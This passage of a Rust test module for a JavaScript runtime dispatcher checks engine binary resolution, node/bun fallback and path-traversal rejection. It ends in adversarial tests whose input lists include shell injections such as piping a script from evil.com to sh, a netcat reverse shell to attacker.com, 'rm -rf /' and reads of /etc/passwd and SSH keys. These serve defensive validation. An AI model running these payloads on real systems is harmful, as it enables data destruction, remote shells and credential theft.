        let candidates = vec![PathBuf::from("/existing/auto")];
        let resolved = resolve_engine_binary_path_with(
            "/missing/configured",
            None,
            None,
            Some(&config),
            &candidates,
            &|path| path == Path::new("/existing/auto"),
        );
        assert_eq!(resolved, "/config/franken-engine");
    }

    #[test]
    fn resolver_cli_beats_config_path() {
        let cli = PathBuf::from("/cli/franken-engine");
        let config = PathBuf::from("/config/franken-engine");
        let candidates = vec![PathBuf::from("/missing/auto")];
        let resolved = resolve_engine_binary_path_with(
            "/missing/configured",
            None,
            Some(&cli),
            Some(&config),
            &candidates,
            &|_| false,
        );
        assert_eq!(resolved, "/cli/franken-engine");
    }

    #[test]
    fn resolver_blank_configured_hint_falls_back_to_default_command() {
        let candidates = vec![PathBuf::from("/missing/auto")];
        let resolved =
            resolve_engine_binary_path_with(" \n\t", None, None, None, &candidates, &|_| false);

        assert_eq!(resolved, "franken-engine");
    }

    #[test]
    fn resolver_env_lookup_uses_franken_node_engine_binary_path() {
        let candidates = vec![PathBuf::from("/missing/auto")];
        let resolved = resolve_engine_binary_path_with_env_lookup(
            "/missing/configured",
            &|key| match key {
                "FRANKEN_ENGINE_BIN" => None,
                "FRANKEN_NODE_ENGINE_BINARY_PATH" => Some("/env-config/franken-engine".into()),
                _ => None,
            },
            &candidates,
            &|_| false,
        );
        assert_eq!(resolved, "/env-config/franken-engine");
    }

    #[test]
    fn command_lookup_does_not_search_path_for_separator_commands() {
        let temp_dir = tempfile::TempDir::new().expect("tempdir");
        let bin_dir = temp_dir.path().join("bin");
        std::fs::create_dir(&bin_dir).expect("bin dir");
        write_fake_executable(&bin_dir.join("node"));
        let path_env = Some(bin_dir.as_os_str().to_os_string());

        assert!(!command_exists_with("../bin/node", path_env, &|_| false));
    }

    #[test]
    fn command_lookup_searches_path_for_command_style_binaries() {
        let temp_dir = tempfile::TempDir::new().expect("tempdir");
        let fake_bin = temp_dir.path().join("bun");
        write_fake_executable(&fake_bin);
        let path_env = Some(temp_dir.path().as_os_str().to_os_string());

        assert!(command_exists_with("bun", path_env, &|path| path.exists()));
    }

    #[test]
    fn command_lookup_rejects_blank_command_without_filesystem_probe() {
        let probed = std::cell::Cell::new(false);
        let resolved = resolve_command_path_with(" \t\n", None, &|_| {
            probed.set(true);
            false
        });

        assert!(resolved.is_none());
        assert!(!probed.get());
    }

    #[test]
    fn command_lookup_rejects_missing_absolute_path_without_path_search() {
        let temp_dir = tempfile::TempDir::new().expect("tempdir");
        let bin_dir = temp_dir.path().join("bin");
        std::fs::create_dir(&bin_dir).expect("bin dir");
        write_fake_executable(&bin_dir.join("node"));
        let path_env = Some(bin_dir.as_os_str().to_os_string());
        let missing_absolute = temp_dir.path().join("missing-node");

        let resolved = resolve_command_path_with(
            missing_absolute
                .to_str()
                .expect("absolute path should be utf8"),
            path_env.as_ref(),
            &|path| {
                assert_eq!(path, missing_absolute.as_path());
                false
            },
        );

        assert!(resolved.is_none());
    }

    #[test]
    fn dispatch_plan_auto_uses_franken_engine_when_available() {
        let temp_dir = tempfile::TempDir::new().expect("tempdir");
        let app = temp_dir.path().join("app.js");
        std::fs::write(&app, "console.log('hello');").expect("write app");
        let runtime_dir = temp_dir.path().join("bin");
        std::fs::create_dir(&runtime_dir).expect("runtime dir");
        let engine_path = runtime_dir.join("franken-engine");
        write_fake_executable(&engine_path);
        write_fake_executable(&runtime_dir.join("node"));

        let plan = resolve_dispatch_plan_with(
            &app,
            PreferredRuntime::Auto,
            DispatchResolutionInputs {
                configured_hint: engine_path.to_str().expect("engine path should be utf8"),
                env_override: None,
                cli_path: None,
                config_path: None,
                candidates: &[runtime_dir.join("node")],
            },
            Some(runtime_dir.as_os_str().to_os_string()),
            &|path| path.exists(),
        )
        .expect("engine plan");

        assert_eq!(
            plan,
            DispatchPlan::FrankenEngine {
                binary: engine_path.display().to_string()
            }
        );
    }

    #[test]
    fn strict_profile_fail_closes_auto_fallback_when_engine_is_missing() {
        let app = Path::new("app.js");

        let err = fallback_runtime_policy_error(Profile::Strict, true, app)
            .expect("strict profile must reject degraded fallback even with opt-in");

        assert!(err.to_string().contains("trust-native runtime unavailable"));
        assert!(
            err.to_string()
                .contains("strict profile requires franken-engine")
        );
    }

    #[test]
    fn non_strict_auto_fallback_requires_explicit_opt_in() {
        let app = Path::new("app.js");

        let balanced_err = fallback_runtime_policy_error(Profile::Balanced, false, app)
            .expect("balanced profile should require degraded fallback opt-in");
        assert!(
            balanced_err
                .to_string()
                .contains(DEGRADED_FALLBACK_OPT_IN_ENV)
        );
        assert!(fallback_runtime_policy_error(Profile::Balanced, true, app).is_none());
        assert!(fallback_runtime_policy_error(Profile::LegacyRisky, true, app).is_none());
    }

    #[test]
    fn dispatch_plan_falls_back_to_node_when_engine_is_missing() {
        let temp_dir = tempfile::TempDir::new().expect("tempdir");
        let app_dir = temp_dir.path().join("app");
        std::fs::create_dir(&app_dir).expect("mkdir");
        let entry = app_dir.join("index.js");
        std::fs::write(&entry, "console.log('hello');").expect("write entry");

        let runtime_dir = temp_dir.path().join("bin");
        std::fs::create_dir(&runtime_dir).expect("runtime dir");
        write_fake_executable(&runtime_dir.join("node"));

        let plan = resolve_dispatch_plan_with(
            &app_dir,
            PreferredRuntime::Auto,
            DispatchResolutionInputs {
                configured_hint: "/missing/franken-engine",
                env_override: None,
                cli_path: None,
                config_path: None,
                candidates: &[PathBuf::from("/missing/auto")],
            },
            Some(runtime_dir.as_os_str().to_os_string()),
            &|path| path.exists(),
        )
        .expect("plan");

        assert_eq!(
            plan,
            DispatchPlan::RuntimeFallback(RuntimeFallbackPlan {
                runtime: "node".to_string(),
                runtime_path: runtime_dir.join("node"),
                target: entry,
                working_dir: app_dir,
                mode: RuntimeExecutionMode::FallbackFrankenEngineUnavailable,
            })
        );
    }

    #[test]
    fn dispatch_plan_prefers_bun_for_bun_projects() {
        let temp_dir = tempfile::TempDir::new().expect("tempdir");
        let app_dir = temp_dir.path().join("app");
        std::fs::create_dir(&app_dir).expect("mkdir");
        let entry = app_dir.join("index.ts");
        std::fs::write(&entry, "console.log('hello');").expect("write entry");
        std::fs::write(app_dir.join("bun.lockb"), "").expect("write bun lock");

        let runtime_dir = temp_dir.path().join("bin");
        std::fs::create_dir(&runtime_dir).expect("runtime dir");
        write_fake_executable(&runtime_dir.join("node"));
        write_fake_executable(&runtime_dir.join("bun"));

        let plan = resolve_dispatch_plan_with(
            &app_dir,
            PreferredRuntime::Auto,
            DispatchResolutionInputs {
                configured_hint: "/missing/franken-engine",
                env_override: None,
                cli_path: None,
                config_path: None,
                candidates: &[PathBuf::from("/missing/auto")],
            },
            Some(runtime_dir.as_os_str().to_os_string()),
            &|path| path.exists(),
        )
        .expect("plan");

        assert_eq!(
            plan,
            DispatchPlan::RuntimeFallback(RuntimeFallbackPlan {
                runtime: "bun".to_string(),
                runtime_path: runtime_dir.join("bun"),
                target: entry,
                working_dir: app_dir,
                mode: RuntimeExecutionMode::FallbackFrankenEngineUnavailable,
            })
        );
    }

    #[test]
    fn dispatch_plan_uses_requested_node_runtime_even_for_bun_projects() {
        let temp_dir = tempfile::TempDir::new().expect("tempdir");
        let app_dir = temp_dir.path().join("app");
        std::fs::create_dir(&app_dir).expect("mkdir");
        let entry = app_dir.join("index.ts");
        std::fs::write(&entry, "console.log('hello');").expect("write entry");
        std::fs::write(app_dir.join("bun.lockb"), "").expect("write bun lock");

        let runtime_dir = temp_dir.path().join("bin");
        std::fs::create_dir(&runtime_dir).expect("runtime dir");
        write_fake_executable(&runtime_dir.join("node"));
        write_fake_executable(&runtime_dir.join("bun"));

        let plan = resolve_dispatch_plan_with(
            &app_dir,
            PreferredRuntime::Node,
            DispatchResolutionInputs {
                configured_hint: "/missing/franken-engine",
                env_override: None,
                cli_path: None,
                config_path: None,
                candidates: &[PathBuf::from("/missing/auto")],
            },
            Some(runtime_dir.as_os_str().to_os_string()),
            &|path| path.exists(),
        )
        .expect("plan");

        assert_eq!(
            plan,
            DispatchPlan::RuntimeFallback(RuntimeFallbackPlan {
                runtime: "node".to_string(),
                runtime_path: runtime_dir.join("node"),
                target: entry,
                working_dir: app_dir,
                mode: RuntimeExecutionMode::Explicit,
            })
        );
    }

    #[test]
    fn dispatch_plan_reports_missing_requested_runtime() {
        let temp_dir = tempfile::TempDir::new().expect("tempdir");
        let app = temp_dir.path().join("app.js");
        std::fs::write(&app, "console.log('hello');").expect("write app");
        let empty_bin = temp_dir.path().join("empty-bin");
        std::fs::create_dir(&empty_bin).expect("empty bin dir");

        let err = resolve_dispatch_plan_with(
            &app,
            PreferredRuntime::Node,
            DispatchResolutionInputs {
                configured_hint: "/missing/franken-engine",
                env_override: None,
                cli_path: None,
                config_path: None,
                candidates: &[PathBuf::from("/missing/auto")],
            },
            Some(empty_bin.as_os_str().to_os_string()),
            &|path| path.exists(),
        )
        .expect_err("missing explicit runtime must fail");

        assert!(matches!(
            err,
            DispatchResolutionError::RequestedRuntimeUnavailable(_)
        ));
        assert!(
            err.to_string()
                .contains("requested runtime `node` was not found")
        );
    }

    #[test]
    fn dispatch_plan_rejects_requested_bun_when_only_node_exists() {
        let temp_dir = tempfile::TempDir::new().expect("tempdir");
        let app = temp_dir.path().join("app.js");
        std::fs::write(&app, "console.log('hello');").expect("write app");
        let runtime_dir = temp_dir.path().join("bin");
        std::fs::create_dir(&runtime_dir).expect("runtime dir");
        write_fake_executable(&runtime_dir.join("node"));

        let err = resolve_dispatch_plan_with(
            &app,
            PreferredRuntime::Bun,
            DispatchResolutionInputs {
                configured_hint: "/missing/franken-engine",
                env_override: None,
                cli_path: None,
                config_path: None,
                candidates: &[PathBuf::from("/missing/auto")],
            },
            Some(runtime_dir.as_os_str().to_os_string()),
            &|path| path.exists(),
        )
        .expect_err("explicit bun selection must not silently fall back to node");

        assert!(matches!(
            err,
            DispatchResolutionError::RequestedRuntimeUnavailable(_)
        ));
        assert!(
            err.to_string()
                .contains("requested runtime `bun` was not found")
        );
    }

    #[test]
    fn dispatch_plan_rejects_auto_when_no_engine_or_fallback_runtime_exists() {
        let temp_dir = tempfile::TempDir::new().expect("tempdir");
        let app = temp_dir.path().join("app.js");
        std::fs::write(&app, "console.log('hello');").expect("write app");
        let empty_bin = temp_dir.path().join("empty-bin");
        std::fs::create_dir(&empty_bin).expect("empty bin dir");

        let err = resolve_dispatch_plan_with(
            &app,
            PreferredRuntime::Auto,
            DispatchResolutionInputs {
                configured_hint: "/missing/franken-engine",
                env_override: None,
                cli_path: None,
                config_path: None,
                candidates: &[PathBuf::from("/missing/auto")],
            },
            Some(empty_bin.as_os_str().to_os_string()),
            &|path| path.exists(),
        )
        .expect_err("auto dispatch must fail when engine, node, and bun are unavailable");

        assert!(matches!(
            err,
            DispatchResolutionError::RequestedRuntimeUnavailable(_)
        ));
        assert!(err.to_string().contains("no fallback runtime is available"));
    }

    #[test]
    fn fallback_runtime_plan_rejects_directory_without_entrypoint() {
        let temp_dir = tempfile::TempDir::new().expect("tempdir");
        let app_dir = temp_dir.path().join("app");
        std::fs::create_dir(&app_dir).expect("mkdir");

        let runtime_dir = temp_dir.path().join("bin");
        std::fs::create_dir(&runtime_dir).expect("runtime dir");
        write_fake_executable(&runtime_dir.join("node"));

        let err = resolve_dispatch_plan_with(
            &app_dir,
            PreferredRuntime::Auto,
            DispatchResolutionInputs {
                configured_hint: "/missing/franken-engine",
                env_override: None,
                cli_path: None,
                config_path: None,
                candidates: &[PathBuf::from("/missing/auto")],
            },
            Some(runtime_dir.as_os_str().to_os_string()),
            &|path| path.exists(),
        )
        .expect_err("fallback runtime must fail closed without an entrypoint");

        assert!(matches!(err, DispatchResolutionError::Resolution(_)));
        assert!(err.to_string().contains("no executable JS entrypoint"));
    }

    #[test]
    fn dispatch_plan_resolution_is_idempotent_for_same_inputs() {
        let temp_dir = tempfile::TempDir::new().expect("tempdir");
        let app_dir = temp_dir.path().join("app");
        std::fs::create_dir(&app_dir).expect("mkdir");
        let entry = app_dir.join("index.js");
        std::fs::write(&entry, "console.log('hello');").expect("write entry");

        let runtime_dir = temp_dir.path().join("bin");
        std::fs::create_dir(&runtime_dir).expect("runtime dir");
        write_fake_executable(&runtime_dir.join("node"));
        let path_env = Some(runtime_dir.as_os_str().to_os_string());
        let candidates = [PathBuf::from("/missing/auto")];

        let resolve = || {
            resolve_dispatch_plan_with(
                &app_dir,
                PreferredRuntime::Auto,
                DispatchResolutionInputs {
                    configured_hint: "/missing/franken-engine",
                    env_override: None,
                    cli_path: None,
                    config_path: None,
                    candidates: &candidates,
                },
                path_env.clone(),
                &|path| path.exists(),
            )
        };

        let first = resolve().expect("first plan");
        let second = resolve().expect("second plan");

        assert_eq!(first, second);
    }

    #[test]
    fn fallback_runtime_plan_rejects_package_main_path_traversal() {
        let temp_dir = tempfile::TempDir::new().expect("tempdir");
        let app_dir = temp_dir.path().join("app");
        std::fs::create_dir(&app_dir).expect("mkdir");
        std::fs::write(
            app_dir.join("package.json"),
            r#"{"name":"demo","main":"../../outside.js"}"#,
        )
        .expect("write package");
        std::fs::write(
            temp_dir.path().join("outside.js"),
            "console.log('outside');",
        )
        .expect("write outside");

        let runtime_dir = temp_dir.path().join("bin");
        std::fs::create_dir(&runtime_dir).expect("runtime dir");
        write_fake_executable(&runtime_dir.join("node"));

        let err = resolve_dispatch_plan_with(
            &app_dir,
            PreferredRuntime::Auto,
            DispatchResolutionInputs {
                configured_hint: "/missing/franken-engine",
                env_override: None,
                cli_path: None,
                config_path: None,
                candidates: &[PathBuf::from("/missing/auto")],
            },
            Some(runtime_dir.as_os_str().to_os_string()),
            &|path| path.exists(),
        )
        .expect_err("package main traversal must fail closed");

        assert!(matches!(err, DispatchResolutionError::Resolution(_)));
        assert!(err.to_string().contains("did not resolve under"));
    }

    #[test]
    fn fallback_runtime_plan_keeps_file_execution_in_parent_working_dir() {
        let temp_dir = tempfile::TempDir::new().expect("tempdir");
        let app_dir = temp_dir.path().join("app");
        let src_dir = app_dir.join("src");
        std::fs::create_dir_all(&src_dir).expect("src dir");
        let entry = src_dir.join("worker.js");
        std::fs::write(&entry, "console.log('worker');").expect("write entry");

        let runtime_dir = temp_dir.path().join("bin");
        std::fs::create_dir(&runtime_dir).expect("runtime dir");
        write_fake_executable(&runtime_dir.join("node"));

        let plan = resolve_dispatch_plan_with(
            &entry,
            PreferredRuntime::Node,
            DispatchResolutionInputs {
                configured_hint: "/missing/franken-engine",
                env_override: None,
                cli_path: None,
                config_path: None,
                candidates: &[PathBuf::from("/missing/auto")],
            },
            Some(runtime_dir.as_os_str().to_os_string()),
            &|path| path.exists(),
        )
        .expect("plan");

        assert_eq!(
            plan,
            DispatchPlan::RuntimeFallback(RuntimeFallbackPlan {
                runtime: "node".to_string(),
                runtime_path: runtime_dir.join("node"),
                target: entry,
                working_dir: src_dir,
                mode: RuntimeExecutionMode::Explicit,
            })
        );
    }

    #[test]
    fn project_prefers_bun_rejects_malformed_package_manifest() {
        let temp_dir = tempfile::TempDir::new().expect("tempdir");
        let app_dir = temp_dir.path().join("app");
        std::fs::create_dir(&app_dir).expect("mkdir");
        std::fs::write(app_dir.join("package.json"), "{not-json").expect("write package");

        assert!(!project_prefers_bun(&app_dir));
    }

    #[test]
    fn project_prefers_bun_rejects_non_string_package_manager() {
        let temp_dir = tempfile::TempDir::new().expect("tempdir");
        let app_dir = temp_dir.path().join("app");
        std::fs::create_dir(&app_dir).expect("mkdir");
        std::fs::write(app_dir.join("package.json"), r#"{"packageManager":42}"#)
            .expect("write package");

        assert!(!project_prefers_bun(&app_dir));
    }

    #[test]
    fn build_dispatch_report_formats_receipt_fields_and_output() {
        let started_at = chrono::DateTime::parse_from_rfc3339("2026-04-17T00:00:00Z")
            .expect("parse time")
            .with_timezone(&Utc);
        let target = Path::new("/workspace/app/index.js");
        let working_dir = Path::new("/workspace/app");

        let report = EngineDispatcher::build_dispatch_report(DispatchReportInputs {
            runtime: "node",
            runtime_path: Path::new("/usr/bin/node"),
            target,
            working_dir,
            used_fallback_runtime: true,
            started_at,
            duration: Duration::from_millis(250),
            output: captured_output(0, b"ok\n", b""),
            telemetry: None,
        });

        assert_eq!(report.runtime, "node");
        assert_eq!(report.runtime_path, "/usr/bin/node");
        assert_eq!(report.target, target.display().to_string());
        assert_eq!(report.working_dir, working_dir.display().to_string());
        assert!(report.used_fallback_runtime);
        assert_eq!(report.started_at_utc, "2026-04-17T00:00:00+00:00");
        assert_eq!(report.duration_ms, 250);
        assert_eq!(report.exit_code, Some(0));
        assert!(!report.terminated_by_signal);
        assert_eq!(report.captured_output.stdout, "ok\n");
        assert!(report.captured_output.stderr.is_empty());
    }

    #[test]
    fn build_dispatch_report_saturates_duration_receipt_field() {
        let started_at = chrono::DateTime::parse_from_rfc3339("2026-04-17T00:00:00Z")
            .expect("parse time")
            .with_timezone(&Utc);

        let report = EngineDispatcher::build_dispatch_report(DispatchReportInputs {
            runtime: "franken_engine",
            runtime_path: Path::new("/bin/franken-engine"),
            target: Path::new("app.js"),
            working_dir: Path::new("."),
            used_fallback_runtime: false,
            started_at,
            duration: Duration::from_secs(u64::MAX),
            output: captured_output(9, b"", b"signal"),
            telemetry: None,
        });

        assert_eq!(report.duration_ms, u64::MAX);
        assert_eq!(report.exit_code, None);
        assert!(report.terminated_by_signal);
        assert_eq!(report.captured_output.stderr, "signal");
    }

    #[test]
    fn build_dispatch_report_lossy_decodes_invalid_utf8_output() {
        let started_at = chrono::DateTime::parse_from_rfc3339("2026-04-17T00:00:00Z")
            .expect("parse time")
            .with_timezone(&Utc);

        let report = EngineDispatcher::build_dispatch_report(DispatchReportInputs {
            runtime: "node",
            runtime_path: Path::new("/usr/bin/node"),
            target: Path::new("app.js"),
            working_dir: Path::new("."),
            used_fallback_runtime: true,
            started_at,
            duration: Duration::from_millis(1),
            output: captured_output(0, &[0xff, b'o', b'k'], &[b'e', 0xfe]),
            telemetry: None,
        });

        assert_eq!(report.captured_output.stdout, "\u{fffd}ok");
        assert_eq!(report.captured_output.stderr, "e\u{fffd}");
    }

    #[test]
    fn dispatch_plan_rejects_missing_explicit_override() {
        let temp_dir = tempfile::TempDir::new().expect("tempdir");
        let app = temp_dir.path().join("app.js");
        std::fs::write(&app, "console.log('hello');").expect("write app");
        let cli_path = temp_dir.path().join("missing-franken-engine");

        let err = resolve_dispatch_plan_with(
            &app,
            PreferredRuntime::Auto,
            DispatchResolutionInputs {
                configured_hint: "/missing/franken-engine",
                env_override: None,
                cli_path: Some(&cli_path),
                config_path: None,
                candidates: &[PathBuf::from("/missing/auto")],
            },
            None,
            &|path| path.exists(),
        )
        .expect_err("missing explicit engine path must fail");

        assert!(err.to_string().contains("configured franken-engine binary"));
        assert!(err.to_string().contains(&cli_path.display().to_string()));
    }

    #[test]
    fn dispatch_plan_rejects_missing_env_override_as_explicit_engine_path() {
        let temp_dir = tempfile::TempDir::new().expect("tempdir");
        let app = temp_dir.path().join("app.js");
        std::fs::write(&app, "console.log('hello');").expect("write app");
        let env_path = temp_dir.path().join("missing-env-franken-engine");

        let err = resolve_dispatch_plan_with(
            &app,
            PreferredRuntime::Auto,
            DispatchResolutionInputs {
                configured_hint: "/missing/franken-engine",
                env_override: Some(env_path.to_str().expect("temp path should be utf8")),
                cli_path: None,
                config_path: None,
                candidates: &[PathBuf::from("/missing/auto")],
            },
            None,
            &|path| path.exists(),
        )
        .expect_err("missing explicit env engine path must fail");

        assert!(err.to_string().contains("configured franken-engine binary"));
        assert!(err.to_string().contains(&env_path.display().to_string()));
    }

    #[test]
    fn default_candidates_do_not_include_machine_specific_fallbacks() {
        let candidates = default_engine_binary_candidates();
        assert!(!candidates.iter().any(|candidate| {
            matches!(
                candidate.to_string_lossy().as_ref(),
                "/data/projects/franken_engine/target/release/franken-engine"
                    | "/dp/franken_engine/target/release/franken-engine"
            )
        }));
    }

    #[test]
    fn spawn_failure_stops_telemetry_bridge_before_returning_error() {
        let tmp = tempfile::TempDir::new().expect("tempdir");
        let sock = tmp.path().join("spawn_failure_cleanup.sock");
        let adapter = Arc::new(Mutex::new(FrankensqliteAdapter::default()));
        let handle = TelemetryBridge::new(sock.to_str().expect("utf8"), adapter)
            .start()
            .expect("start");

        let missing_bin = tmp.path().join("missing-franken-engine");
        let mut cmd = Command::new(&missing_bin);
        let err = EngineDispatcher::run_engine_process(&mut cmd, handle).expect_err("spawn fails");

        match err {
            EngineProcessError::Spawn {
                message,
                telemetry_report: Some(report),
            } => {
                assert!(message.contains("Failed to spawn franken_engine process"));
                assert!(message.contains("telemetry bridge stopped after launch failure"));
                assert!(report.drain_completed);
                assert_eq!(report.final_state, BridgeLifecycleState::Stopped);
                assert!(
                    report.recent_events.iter().any(|event| event.code
                        == event_codes::DRAIN_STARTED
                        && event.reason_code.as_deref() == Some(reason_codes::SHUTDOWN_REQUESTED))
                );
                assert!(
                    report
                        .recent_events
                        .iter()
                        .any(|event| event.code == event_codes::DRAIN_COMPLETE)
                );
                assert!(
                    !report
                        .recent_events
                        .iter()
                        .any(|event| event.code == event_codes::DRAIN_TIMEOUT)
                );
            }
            other => unreachable!("expected spawn error with cleanup report, got {other:?}"),
        }
    }

    // ═══ EXTREME ADVERSARIAL NEGATIVE-PATH TESTS ═══
    // These tests target sophisticated attack vectors against engine dispatch and process execution systems

    #[test]
    fn test_extreme_adversarial_engine_path_injection_attack() {
        // Test engine path injection attacks where attacker manipulates engine binary paths
        // to execute malicious commands, escape sandbox boundaries, or gain system access

        // Malicious engine path injection patterns
        let malicious_engine_paths = [
            // Command injection via path manipulation
            "/usr/bin/engine; rm -rf /",
            "/usr/bin/engine && curl evil.com/backdoor.sh | sh",
            "/usr/bin/engine || cat /etc/passwd",
            "/usr/bin/engine | nc attacker.com 4444 -e /bin/sh",
            // Shell metacharacter injection
            "/usr/bin/engine $(whoami)",
            "/usr/bin/engine `id`",
            "/usr/bin/engine ${PATH}",
            "/usr/bin/engine $HOME/.ssh/id_rsa",
            // Path traversal attacks
            "../../../etc/passwd",
            "../../../../bin/sh",
            "../../../usr/bin/curl",
            "../../../../../../proc/self/exe",
            "/proc/self/fd/0",
            "/dev/stdin",
            "/dev/null; /bin/sh",
            // Null byte injection
            "/usr/bin/engine\x00/bin/sh",
            "/legitimate/path\x00; rm -rf /",
            "engine\x00evil_command",
            // Environment variable injection
            "/usr/bin/$MALICIOUS_VAR",
            "${SHELL}",
            "$HOME/../../../bin/sh",
            "$(echo /bin/sh)",
            // Network-based injection
            "http://evil.com/malicious_engine",
            "ftp://attacker.com/backdoor",
            "//evil.com/shared/malicious",
            "file:///etc/passwd",
            // Unicode and encoding attacks
            "/usr/bin/engine\u{202E}gne_live", // Bidirectional override
            "/usr/bin/engine\u{200B}hidden",   // Zero-width space
            "/usr/bin/engine\u{FEFF}bom",      // BOM injection
            // Control character injection
            "/usr/bin/engine\r\necho hacked",
            "/usr/bin/engine\x1B[31mcolored",
            "/usr/bin/engine\x08\x09\x0A",
            // Buffer overflow simulation
            "A".repeat(10000),
            "/".repeat(1000) + "bin/sh",
            // Format string injection
            "/usr/bin/engine%n%s%x",
            "/usr/bin/%d%f%c/engine",
            // Symlink traversal
            "/tmp/../usr/bin/engine",
            "/var/tmp/../../../bin/sh",
            "./../../../../bin/bash",
        ];

        for (attack_idx, malicious_path) in malicious_engine_paths.iter().enumerate() {
            println!(
                "Testing engine path injection attack {}: {}",
                attack_idx,
                if malicious_path.len() > 80 {
                    format!("{}...", &malicious_path[..80])
                } else {
                    malicious_path.to_string()
                }
            );

            // Create dispatcher with malicious engine path
            let injection_result = std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| {
                let dispatcher = EngineDispatcher::new(
                    malicious_path.to_string(),
                    None,
                    PreferredRuntime::FrankenEngine,
                );

                // Test path resolution with injection
                let config = Config {
                    preferred_runtime: PreferredRuntime::FrankenEngine,
                    engine_path: Some(malicious_path.into()),
                    ..Default::default()
                };

                // Attempt to resolve runtime with malicious path
                let resolution_result = dispatcher.resolve_runtime_internal(
                    &config, None, // env_override
                    None, // cli_path
                );

                match resolution_result {
                    Ok(plan) => {
                        // If resolution succeeds, verify no command injection
                        match plan {
                            DispatchPlan::FrankenEngine { ref binary } => {
                                // Verify binary path sanitization
                                assert!(
                                    !binary.contains(';'),
                                    "Attack {}: Binary path should not contain command separators",
                                    attack_idx
                                );
                                assert!(
                                    !binary.contains('&'),
                                    "Attack {}: Binary path should not contain command chaining",
                                    attack_idx
                                );
                                assert!(
                                    !binary.contains('|'),
                                    "Attack {}: Binary path should not contain pipes",
                                    attack_idx
                                );
                                assert!(
                                    !binary.contains('$'),
                                    "Attack {}: Binary path should not contain variable expansion",
                                    attack_idx
                                );
                                assert!(
                                    !binary.contains('`'),
                                    "Attack {}: Binary path should not contain command substitution",
                                    attack_idx
                                );
                                assert!(
                                    !binary.contains('\0'),
                                    "Attack {}: Binary path should not contain null bytes",
                                    attack_idx
                                );

                                // Verify no path traversal beyond reasonable bounds
                                let traversal_count = binary.matches("../").count();
                                assert!(
                                    traversal_count <= 5,
                                    "Attack {}: Excessive path traversal detected: {}",
                                    attack_idx,
                                    traversal_count
                                );

                                // Verify length limits
                                assert!(
                                    binary.len() <= 4096,
                                    "Attack {}: Binary path should have reasonable length limit",
                                    attack_idx
                                );
                            }
                            DispatchPlan::RuntimeFallback(ref fallback) => {
                                // Verify fallback path safety
                                let path_str = fallback.runtime_path.to_string_lossy();
                                assert!(
                                    !path_str.contains(';'),
                                    "Attack {}: Fallback path should not contain command separators",
                                    attack_idx
                                );
                                assert!(
                                    !path_str.contains('\0'),
                                    "Attack {}: Fallback path should not contain null bytes",
                                    attack_idx
                                );
                            }
                        }

                        // Test actual execution safety (without actually running)
                        // This tests the command construction phase
                        let temp_dir = std::env::temp_dir();
                        let dummy_target = temp_dir.join("dummy_target");

                        // Create a minimal dummy target file
                        std::fs::write(&dummy_target, "dummy content").ok();

                        // Test dispatch preparation (should not execute)
                        let dispatch_inputs = DispatchResolutionInputs {
                            configured_hint: "franken_engine",
                            env_override: None,
                            cli_path: None,
                            config_path: None,
                            candidates: &[],
                        };

                        // Verify dispatch input handling
                        assert!(
                            !dispatch_inputs.configured_hint.contains('\0'),
                            "Attack {}: Dispatch inputs should be sanitized",
                            attack_idx
                        );
                    }
                    Err(e) => {
                        // Expected behavior for many malicious paths
                        let error_msg = e.to_string();
                        assert!(
                            !error_msg.contains('\0'),
                            "Attack {}: Error message should not contain null bytes",
                            attack_idx
                        );
                        assert!(
                            !error_msg.contains(';'),
                            "Attack {}: Error message should not contain command separators",
                            attack_idx
                        );
                        assert!(
                            error_msg.len() <= 10000,
                            "Attack {}: Error message should have reasonable length",
                            attack_idx
                        );
                    }
                }

                Ok(())
            }));

            match injection_result {
                Ok(_) => {
                    // Test completed successfully
                }
                Err(_) => {
                    println!("Attack {} caused panic (safely caught)", attack_idx);
                }
            }
        }

        println!(
            "Engine path injection test completed: {} attack vectors tested",
            malicious_engine_paths.len()
        );
    }

    #[test]
    fn test_extreme_adversarial_working_directory_manipulation_attack() {
        // Test working directory manipulation attacks where attacker crafts malicious
        // working directories to escape containment, access sensitive files, or manipulate execution

        let dispatcher = EngineDispatcher::new(
            "test_engine".to_string(),
            None,
            PreferredRuntime::FrankenEngine,
        );

        // Malicious working directory patterns
        let malicious_work_dirs = [
            // Path traversal escapes
            "../../../etc",
            "../../../../usr/bin",
            "../../../root/.ssh",
            "../../../../../../proc",
            "../../../tmp/../etc/passwd",
            // Absolute path escapes
            "/etc",
            "/usr/bin",
            "/root",
            "/proc/self",
            "/dev",
            "/sys/kernel",
            // Special device files
            "/dev/null",
            "/dev/zero",
            "/dev/random",
            "/dev/urandom",
            "/dev/stdin",
            "/dev/stdout",
            "/dev/stderr",
            // Network mounts and special filesystems
            "/proc/self/fd",
            "/proc/self/exe",
            "/proc/self/environ",
            "/sys/class/net",
            "/sys/kernel/debug",
            // Symlink attacks
            "/tmp/../var/log",
            "/var/tmp/../../../home",
            "./../../../../etc",
            "symlink_to_sensitive_dir",
            // Command injection in directory names
            "/tmp; rm -rf /",
            "/tmp && curl evil.com",
            "/tmp | nc attacker.com 4444",
            "/tmp $(whoami)",
            "/tmp `id`",
            "/tmp ${PATH}",
            // Control character injection
            "/tmp\x00/malicious",
            "/tmp\r\n/injection",
            "/tmp\x1B[31m/colored",
            "/tmp\x08\x09\x0A",
            // Unicode attacks
            "/tmp\u{202E}rid_evila", // Bidirectional override
            "/tmp\u{200B}/hidden",   // Zero-width space
            "/tmp\u{FEFF}/bom",      // BOM injection
            // Buffer overflow simulation
            "/".repeat(5000),
            "/tmp/".repeat(1000),
            "A".repeat(10000),
            // Null byte directory traversal
            "/tmp\x00/../../../etc",
            "safe_dir\x00/../../etc/passwd",
        ];

        for (attack_idx, malicious_dir) in malicious_work_dirs.iter().enumerate() {
            println!(
                "Testing working directory attack {}: {}",
                attack_idx,
                if malicious_dir.len() > 80 {
                    format!("{}...", &malicious_dir[..80])
                } else {
                    malicious_dir.to_string()
                }
            );

            let manipulation_result = std::panic::catch_unwind(std::panic::AssertUnwindSafe(
                || {
                    let malicious_path = PathBuf::from(malicious_dir);
                    let temp_target = std::env::temp_dir().join("test_target");
                    std::fs::write(&temp_target, "test content").ok();

                    // Create runtime fallback plan with malicious working directory
                    let fallback_plan = RuntimeFallbackPlan {
                        runtime: "node".to_string(),
                        runtime_path: PathBuf::from("/usr/bin/node"),
                        target: temp_target.clone(),
                        working_dir: malicious_path.clone(),
                        mode: RuntimeExecutionMode::Explicit,
                    };

                    // Test working directory validation
                    let work_dir_str = fallback_plan.working_dir.to_string_lossy();

                    // Verify working directory sanitization
                    assert!(
                        !work_dir_str.contains('\0'),
                        "Attack {}: Working directory should not contain null bytes",
                        attack_idx
                    );

